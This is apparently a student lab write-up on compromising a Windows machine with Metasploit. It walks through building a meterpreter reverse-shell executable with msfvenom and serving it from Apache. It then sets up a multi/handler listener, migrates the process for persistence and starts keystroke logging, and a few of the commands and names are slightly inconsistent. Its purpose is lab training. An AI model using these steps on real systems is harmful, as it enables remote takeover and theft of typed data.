# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
### Find the attackers ip address using ifconfig

## OUTPUT :
![image](https://github.com/user-attachments/assets/b8d1f4f4-925d-4e88-b1d6-e7d6658edc4c)


### Create a malicious executable file fun.exe using msfvenom command

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT :

![image](https://github.com/user-attachments/assets/856b040f-1775-471e-8e1e-d667f4569ba7)


copy the fun.exe into the apache /var/www/html folder
sudo systemctl apache2 start

## Check the status of apache2

## OUTPUT :
![image](https://github.com/user-attachments/assets/23ac336b-a8d6-4edf-93fe-3434daf6c452)


### Invoke msfconsole:
## OUTPUT:
![image](https://github.com/user-attachments/assets/3f3b2ffa-2a16-496b-a1cb-2cd25e6cbf68)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

## OUTPUT :
![image](https://github.com/user-attachments/assets/858063e6-84c6-44da-8768-dc6e9d0d571e)

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
## OUTPUT :
![image](https://github.com/user-attachments/assets/3bdd15b7-7b32-45c8-927f-49573ac59eb3)


### WINDOWS :

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads

## BROWSE OUTPUT :

![image](https://github.com/user-attachments/assets/e4257a84-2cc0-4c63-a45f-c12a4cb3fb48)


## DOWNLOAD OUTPUT :

![image](https://github.com/user-attachments/assets/8f0154f2-01ac-4e17-b854-22405d7699db)


## COME BACK TO PARROT :

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

## OUTPUT :
![image](https://github.com/user-attachments/assets/c7cf0b48-44e7-4e22-b159-78a9fe41afea)



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

## OUTPUT :

![image](https://github.com/user-attachments/assets/878e7940-120a-46f1-bfd4-3230a7788276)

## WINDOWS OUTPUT :

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

## OUTPUT :

![image](https://github.com/user-attachments/assets/5ba33154-e470-483d-aafc-762d21b6946b)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
